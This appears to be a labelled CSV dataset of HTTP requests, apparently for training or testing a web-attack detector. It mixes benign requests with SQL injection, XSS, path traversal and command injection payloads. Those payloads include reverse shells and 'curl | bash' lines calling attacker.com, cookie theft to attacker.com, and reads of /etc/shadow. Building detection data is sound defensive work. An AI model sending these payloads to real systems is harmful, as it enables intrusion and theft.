request_text,label
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--&password=test",sqli
"GET /profile?q=<svg onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /ping?host=check&& env HTTP/1.1
Host: example.com",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1$(curl attacker.com/c2?h=$(hostname))",cmdi
"GET /comment?q=<svg onload=prompt(document.domain)> HTTP/1.1
Host: example.com",xss
"GET /help HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /admin/login?q=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: example.com",sqli
"DELETE /api/cart/item/100 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /ping?host=check; cat /etc/passwd HTTP/1.1
Host: example.com",cmdi
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; id",cmdi
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' OR '1'='1'--&password=test",sqli
"GET /search?q=gaming chair&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /files/app.js HTTP/1.1
Host: example.com",benign
"PUT /api/users/judy HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""judy@email.com"",""name"":""Judy""}",benign
"GET /tools?host=localhost&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])' HTTP/1.1
Host: example.com",cmdi
"GET /debug?host=8.8.8.8; id HTTP/1.1
Host: example.com",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1&password=test",sqli
"GET /feedback?q=<style>body{background:url('javascript:alert(1)')}</style> HTTP/1.1
Host: example.com",xss
"GET /api/execute?host=localhost| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: example.com",cmdi
"GET /files?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost&& uname -a",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg/onload=alert(1)>&user=test",xss
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; curl http://attacker.com/shell.sh | bash",cmdi
"GET /files?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1; cat /etc/passwd",cmdi
"GET /view?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /run?host=8.8.8.8| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: example.com",cmdi
"GET /api/auth?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
Host: example.com",sqli
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /api/file?file=php://input HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR EXISTS(SELECT * FROM users WHERE username='admin')--&password=test",sqli
"GET /product?q=OR 1=1# HTTP/1.1
Host: example.com",sqli
"GET /view?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/data?limit=89&offset=97&format=json HTTP/1.1
Host: example.com",benign
"DELETE /api/cart/item/465 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<details open ontoggle=alert(1)>&user=test",xss
"GET /search?q=coffee maker&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"GET /search?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
Host: example.com",sqli
"GET /exec?host=192.168.1.1; whoami HTTP/1.1
Host: example.com",cmdi
"GET /posts?q=&#60;script&#62;alert(1)&#60;/script&#62; HTTP/1.1
Host: example.com",xss
"GET /files?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR IF(1=1,SLEEP(3),0)--&password=test",sqli
"GET /tools?host=localhost| set HTTP/1.1
Host: example.com",cmdi
"GET /posts?q=';alert(String.fromCharCode(88,83,83))// HTTP/1.1
Host: example.com",xss
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>&user=test",xss
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| whoami",cmdi
"GET /tools?host=test; whoami HTTP/1.1
Host: example.com",cmdi
"GET /view?file=../../../../var/www/html/.htpasswd HTTP/1.1
Host: example.com",traversal
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src='x' onerror='alert(document.cookie)'>&user=test",xss
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT user()--&password=test",sqli
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<body onload=alert(1)>&user=test",xss
"GET /ping?host=test| type C:\Windows\System32\drivers\etc\hosts HTTP/1.1
Host: example.com",cmdi
"GET /product/cat_books HTTP/1.1
Host: example.com
Accept: application/json",benign
"PUT /api/users/eve HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""eve@email.com"",""name"":""Eve""}",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<audio src=x onerror=alert(1)>&user=test",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=0x27 OR 0x31=0x31--&password=test",sqli
"PUT /api/users/eve HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""eve@email.com"",""name"":""Eve""}",benign
"GET /api/data?limit=22&offset=43&format=json HTTP/1.1
Host: example.com",benign
"GET /profile?q=<body onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /images?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /comment?q=<select onchange=alert(1)><option>1</option></select> HTTP/1.1
Host: example.com",xss
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"GET /search?q=desk lamp&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /api/auth?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
Host: example.com",sqli
"GET /product?q=' HAVING 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /product/item_456 HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /search?q='><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"GET /api/data?limit=72&offset=107&format=json HTTP/1.1
Host: example.com",benign
"GET /posts?q='><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"GET /api/file?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /files?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"GET /download?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /comment?q=<svg onload=prompt(document.domain)> HTTP/1.1
Host: example.com",xss
"GET /search?q=1 UNION SELECT @@datadir-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; EXEC xp_cmdshell('whoami')--&password=test",sqli
"GET /api/data?limit=52&offset=69&format=json HTTP/1.1
Host: example.com",benign
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe onload=alert(1)>&user=test",xss
"GET /profile?q=&#60;script&#62;alert(1)&#60;/script&#62; HTTP/1.1
Host: example.com",xss
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe src=javascript:alert(1)></iframe>&user=test",xss
"GET /profile?q='; alert(1); var x=' HTTP/1.1
Host: example.com",xss
"GET /search?q=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: example.com",sqli
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; INSERT INTO users (username,password) VALUES ('hacked','hacked')--&password=test",sqli
"GET /search?q=blue shirt&page=7&sort=asc HTTP/1.1
Host: example.com",benign
"GET /api/auth?q=' OR '1'='1' /* HTTP/1.1
Host: example.com",sqli
"GET /admin/login?q=' HAVING 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' GROUP BY 1--&password=test",sqli
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1$(whoami)",cmdi
"GET /admin/login?q=' UNION SELECT null-- HTTP/1.1
Host: example.com",sqli
"GET /about HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 'x'='x&password=test",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND extractvalue(1,concat(0x7e,version()))--&password=test",sqli
"GET /comment?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"GET /user?q='; DROP TABLE users; -- HTTP/1.1
Host: example.com",sqli
"GET /exec?host=check; uname -a HTTP/1.1
Host: example.com",cmdi
"GET /tools?host=192.168.1.1; uname -a HTTP/1.1
Host: example.com",cmdi
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' OR '1'='1'--&password=test",sqli
"GET /checkout?q=1 UNION SELECT user()-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' ORDER BY 10--&password=test",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check$(id)",cmdi
"GET /checkout?q=' UNION SELECT null,null-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=&#60;script&#62;alert(1)&#60;/script&#62;&user=test",xss
"GET /comment?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='><script>alert(1)</script>&user=test",xss
"GET /images?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /profile?q=""><script>alert(1)</script> HTTP/1.1
Host: example.com",xss
"GET /comment?q=<svg onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg onload=alert(1)>&user=test",xss
"GET /posts?q=<body onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /login?q=';SELECT pg_sleep(5)-- HTTP/1.1
Host: example.com",sqli
"GET /product?q=' HAVING 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /static?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<ScRiPt>alert(1)</ScRiPt>&user=test",xss
"GET /files?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/482 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"PUT /api/users/john_doe HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""john_doe@email.com"",""name"":""John Doe""}",benign
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='><script>alert(1)</script>&user=test",xss
"GET /api/file?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /view?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /images?file=../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /ping?host=192.168.1.1| cat /etc/shadow HTTP/1.1
Host: example.com",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=john_doe&password=SecureP@ss1",benign
"GET /profile?q=<script>alert('XSS')</script> HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' GROUP BY 1--&password=test",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' OR '1'='1'--&password=test",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8; cat /etc/passwd",cmdi
"GET /tools?host=192.168.1.1$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' HAVING 1=1--&password=test",sqli
"DELETE /api/cart/item/409 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /product/sale_items HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /settings HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /comment?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"GET /search?q=<object data=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=SecureP@ss1",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<div style='background:url(javascript:alert(1))'>&user=test",xss
"GET /profile?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=') OR ('1'='1&password=test",sqli
"GET /product/brand_sony HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /static?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /tools?host=8.8.8.8; find / -name id_rsa 2>/dev/null HTTP/1.1
Host: example.com",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| find / -perm -4000 2>/dev/null",cmdi
"PUT /api/users/bob HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""bob@email.com"",""name"":""Bob""}",benign
"GET /api/file?file=/proc/self/cmdline HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=ivan&password=SecureP@ss1",benign
"GET /search?q=wireless mouse&page=5&sort=asc HTTP/1.1
Host: example.com",benign
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; EXEC xp_cmdshell('whoami')--&password=test",sqli
"GET /home HTTP/1.1
Host: example.com
Authorization: Bearer key_xyz123",benign
"GET /view?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"GET /product/product_123 HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /login?q=' UNION SELECT null,null,null-- HTTP/1.1
Host: example.com",sqli
"GET /static?file=expect://id HTTP/1.1
Host: example.com",traversal
"GET /download?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"GET /images?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /download?file=/../../boot.ini HTTP/1.1
Host: example.com",traversal
"GET /images?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"GET /posts?q=<svg onload=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=0x27 OR 0x31=0x31--&password=test",sqli
"GET /comment?q=<script>document.location='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
